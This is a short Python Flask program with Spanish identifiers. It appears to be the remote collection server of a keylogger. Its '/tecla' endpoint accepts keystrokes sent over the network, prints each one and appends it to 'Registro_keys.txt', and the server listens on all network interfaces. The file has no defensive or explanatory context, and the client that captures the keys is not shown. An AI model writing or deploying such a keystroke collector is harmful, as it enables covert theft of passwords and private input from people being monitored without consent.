from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/tecla', methods=['POST'])

def recibir_tecla():
    data = request.get_json()
    tecla = data.get('tecla', '')
    print(f"Tecla presionada: {tecla}")
    
    with open("Registro_keys.txt", "a") as registro:
        registro.write(f"Tecla presionada: {tecla}\n")

    return json.dumps({'status': 'ok'}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)



